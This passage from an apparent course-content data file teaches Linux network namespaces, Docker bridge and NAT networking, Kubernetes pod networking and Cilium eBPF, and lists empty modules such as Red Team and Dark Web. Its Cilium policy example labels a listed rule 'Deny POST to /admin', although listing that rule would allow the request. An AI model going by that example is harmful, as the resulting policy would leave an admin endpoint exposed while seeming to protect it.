- Completely separate from the host and other namespaces

**Hands-on with network namespaces:**
\`\`\`bash
# Create two namespaces
ip netns add red
ip netns add blue

# Each has its own loopback (lo), nothing else
ip netns exec red ip link list   # only lo

# Create a veth pair (virtual ethernet — like a cable)
ip link add veth-red type veth peer name veth-blue

# Move each end to a namespace
ip link set veth-red netns red
ip link set veth-blue netns blue

# Assign IPs
ip netns exec red ip addr add 10.0.0.1/24 dev veth-red
ip netns exec blue ip addr add 10.0.0.2/24 dev veth-blue

# Bring interfaces up
ip netns exec red ip link set veth-red up
ip netns exec blue ip link set veth-blue up

# Now they can communicate
ip netns exec red ping 10.0.0.2   # works!
\`\`\`

**veth pairs:**
- Virtual ethernet cable — two ends, connected together
- Packets in one end come out the other
- Like a network cable between two virtual machines
- This is how containers connect to the host network

**The 6 Linux namespaces used by containers:**
| Namespace | Isolates |
|---|---|
| **Network** | Network interfaces, routes, iptables |
| **PID** | Process IDs (container sees PID 1) |
| **Mount** | Filesystem mounts |
| **UTS** | Hostname |
| **IPC** | Shared memory, semaphores |
| **User** | User/group IDs |`
      },
      {
        titleEn: "Docker Networking — Bridge, veth, NAT",
        contentEn: `**Docker's default networking uses a Linux bridge + veth pairs + NAT.**

**Architecture diagram:**
\`\`\`
Host Machine
┌─────────────────────────────────────────────────┐
│                                                 │
│  Container A          Container B               │
│  ┌──────────┐        ┌──────────┐              │
│  │ eth0     │        │ eth0     │              │
│  │ 172.17.  │        │ 172.17.  │              │
│  │ 0.2      │        │ 0.3      │              │
│  └────┬─────┘        └────┬─────┘              │
│       │ veth-A            │ veth-B              │
│       │                   │                     │
│  ┌────┴───────────────────┴─────┐              │
│  │        docker0 bridge         │              │
│  │        172.17.0.1             │              │
│  └──────────────┬───────────────┘              │
│                 │                               │
│            iptables NAT                         │
│          (MASQUERADE)                           │
│                 │                               │
│  ┌──────────────┴───────────────┐              │
│  │           eth0 (host)         │              │
│  │        192.168.1.100          │              │
│  └──────────────────────────────┘              │
└─────────────────────────────────────────────────┘
\`\`\`

**How it works step by step:**
1. Docker creates the **docker0** bridge (like a virtual switch)
2. Each container gets a **veth pair** — one end in container (eth0), one end on bridge
3. Containers on the same bridge can talk to each other directly (Layer 2)
4. To reach the internet: **iptables NAT** translates container IP → host IP

**Docker network types:**
| Type | Use Case | Isolation |
|---|---|---|
| **bridge** (default) | Container ↔ container on same host | Good |
| **host** | Container uses host's network directly | None |
| **none** | No networking at all | Full |
| **overlay** | Container ↔ container across hosts (Swarm) | Good |
| **macvlan** | Container gets real MAC/IP on physical network | Good |

**Port mapping (bridge mode):**
\`\`\`bash
docker run -p 8080:80 nginx
# iptables DNAT rule created:
# Host:8080 → Container:80
\`\`\``
      },
      {
        titleEn: "Kubernetes Pod Networking",
        contentEn: `**K8s networking rule: every Pod gets a real IP. Pods can reach any other Pod without NAT.**

**Same node — Pod to Pod:**
\`\`\`
Node 1 (10.0.1.0/24)
┌─────────────────────────────────────┐
│  Pod A (10.0.1.2)    Pod B (10.0.1.3)│
│  ┌────────┐         ┌────────┐      │
│  │  eth0  │         │  eth0  │      │
│  └───┬────┘         └───┬────┘      │
│      │ veth              │ veth      │
│  ┌───┴──────────────────┴───┐       │
│  │       cbr0 bridge         │       │
│  └───────────────────────────┘       │
└─────────────────────────────────────┘

Pod A → bridge → Pod B (direct, Layer 2)
\`\`\`

**Cross node — Pod to Pod on different nodes:**
\`\`\`
Node 1 (10.0.1.0/24)              Node 2 (10.0.2.0/24)
┌──────────────────┐              ┌──────────────────┐
│  Pod A (10.0.1.2)│              │  Pod C (10.0.2.5)│
│  ┌────────┐      │              │  ┌────────┐      │
│  │  eth0  │      │              │  │  eth0  │      │
│  └───┬────┘      │              │  └───┬────┘      │
│      │ veth      │              │      │ veth      │
│  ┌───┴────┐      │              │  ┌───┴────┐      │
│  │ bridge │      │              │  │ bridge │      │
│  └───┬────┘      │              │  └───┬────┘      │
│      │           │              │      │           │
│  [eth0/tunnel]   │              │  [eth0/tunnel]   │
└──────┬───────────┘              └──────┬───────────┘
       │        Overlay / Routing        │
       └────────────────────────────────┘
\`\`\`

**Cross-node solutions (CNI plugins):**
| Plugin | Method | Speed |
|---|---|---|
| **Flannel** | VXLAN overlay (encapsulation) | Good |
| **Calico** | BGP routing (no overlay) | Fast |
| **Cilium** | eBPF (replaces iptables + kube-proxy) | Fastest |
| **Weave** | Encrypted overlay | Good |

**K8s Service networking:**
- **ClusterIP** — virtual IP, load balances to Pod IPs (kube-proxy / eBPF)
- **NodePort** — exposes on every node's IP:port (30000-32767)
- **LoadBalancer** — cloud provider provisions external LB
- **Ingress** — L7 routing (host/path rules → Services)`
      },
      {
        titleEn: "Cilium — eBPF Replaces iptables",
        contentEn: `**Cilium uses eBPF to replace kube-proxy and iptables entirely.**

**The iptables problem in Kubernetes:**
\`\`\`
With kube-proxy + iptables:

Each Service creates ~8 iptables rules
1000 Services = ~8000 rules
Each rule = linear scan (O(n))

Pod sends packet → iptables checks rule 1 → no match
                 → checks rule 2 → no match
                 → ...
                 → checks rule 5847 → match! → forward

Time: O(n) per packet, n = number of rules
Update: full iptables rewrite on any Service change
\`\`\`

**Cilium's eBPF approach:**
\`\`\`
With Cilium:

All Services stored in eBPF hash map
Lookup = O(1) regardless of number of Services

Pod sends packet → eBPF program → hash lookup → forward

Time: O(1) per packet
Update: single map entry update (no full rewrite)
\`\`\`

**Cilium features beyond basic networking:**

**L7 Network Policies:**
\`\`\`yaml
# Traditional K8s NetworkPolicy: L3/L4 only
# "Pod A can talk to Pod B on port 80"

# Cilium CiliumNetworkPolicy: L7 aware
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
spec:
  endpointSelector:
    matchLabels:
      app: api-server
  ingress:
  - fromEndpoints:
    - matchLabels:
        app: frontend
    toPorts:
    - ports:
      - port: "80"
      rules:
        http:
        - method: "GET"    # Allow GET
          path: "/api/.*"
        - method: "POST"   # Deny POST to /admin
          path: "/admin"
          # not listed = denied
\`\`\`

**Hubble — network observability:**
- Captures all network flows using eBPF
- No sidecar proxy needed (unlike Istio/Envoy)
- Shows: source pod → destination pod, protocol, verdict (allow/deny), latency
- UI: real-time service dependency map

**Performance comparison:**

| Metric | kube-proxy + iptables | Cilium eBPF |
|---|---|---|
| Service lookup | O(n) | O(1) |
| Rule update | Full rewrite | Single entry |
| Latency (1K services) | ~1ms | ~0.1ms |
| CPU at 10K services | High | Low |
| L7 policy | Not possible | Yes (HTTP, gRPC, Kafka) |
| Observability | External tools | Built-in (Hubble) |

{thinkOutside}
Your company runs 500 microservices in Kubernetes. Currently using Flannel (VXLAN overlay) + kube-proxy (iptables). Users report latency spikes during deployments. What would you recommend changing, and why?`
      }
    ]
  },

  // ===== System & Linux (401-410) =====
  401: { titleEn: "Introduction to Linux", pages: [] },
  402: { titleEn: "Essential Commands", pages: [] },
  403: { titleEn: "Permissions & Users", pages: [] },
  404: { titleEn: "Networking Tools", pages: [] },
  405: { titleEn: "Bash Scripting", pages: [] },
  406: { titleEn: "Process Management", pages: [] },
  407: { titleEn: "Package Management", pages: [] },
  408: { titleEn: "Storage & File Systems", pages: [] },
  409: { titleEn: "Troubleshooting", pages: [] },
  410: { titleEn: "Linux Security Basics", pages: [] },

  // ===== Web & APIs (501-508) =====
  501: { titleEn: "How the Web Works", pages: [] },
  502: { titleEn: "HTTP in Depth", pages: [] },
  503: { titleEn: "REST APIs", pages: [] },
  504: { titleEn: "Authentication & Authorization", pages: [] },
  505: { titleEn: "Browser Internals", pages: [] },
  506: { titleEn: "API Security", pages: [] },
  507: { titleEn: "Tools — Postman, curl, DevTools", pages: [] },
  508: { titleEn: "Real-World Patterns", pages: [] },

  // ===== Red Team (601-608) =====
  601: { titleEn: "Introduction to Ethical Hacking", pages: [] },
  602: { titleEn: "Kali Linux Setup", pages: [] },
  603: { titleEn: "Reconnaissance", pages: [] },
  604: { titleEn: "Scanning & Enumeration", pages: [] },
  605: { titleEn: "Web Vulnerabilities", pages: [] },
  606: { titleEn: "Exploitation Basics", pages: [] },
  607: { titleEn: "Password Attacks", pages: [] },
  608: { titleEn: "Report Writing", pages: [] },

  // ===== Dark Web & Privacy (801-805) =====
  801: { titleEn: "Surface, Deep, and Dark Web", pages: [] },
  802: { titleEn: "How Tor Works", pages: [] },
  803: { titleEn: "Hidden Services (.onion)", pages: [] },
  804: { titleEn: "Privacy Tools", pages: [] },
  805: { titleEn: "Ethics & Law", pages: [] },

  // ===== Secure Development (701-708) =====
  701: { titleEn: "OWASP Top 10", pages: [] },
  702: { titleEn: "Injection Attacks", pages: [] },
  703: { titleEn: "Authentication Security", pages: [] },
  704: { titleEn: "XSS Prevention", pages: [] },
  705: { titleEn: "API Security", pages: [] },
  706: { titleEn: "Secure Coding Practices", pages: [] },
  707: { titleEn: "AI Security & Prompt Injection", pages: [] },
  708: { titleEn: "Security in CI/CD", pages: [] },
}
